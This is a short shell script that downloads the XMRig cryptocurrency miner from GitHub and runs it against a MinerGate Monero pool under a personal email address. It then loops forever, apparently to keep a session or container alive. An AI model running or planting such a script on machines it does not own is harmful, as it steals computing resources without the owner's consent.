#!/bin/sh
sudo apt update
sudo apt install screen -y

wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
tar xf xmrig-6.10.0-linux-x64.tar.gz
cd xmrig-6.10.0
./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u shabeersha786786@gmail.com -p x

while [ 1 ]; do
sleep 3
done
sleep 999
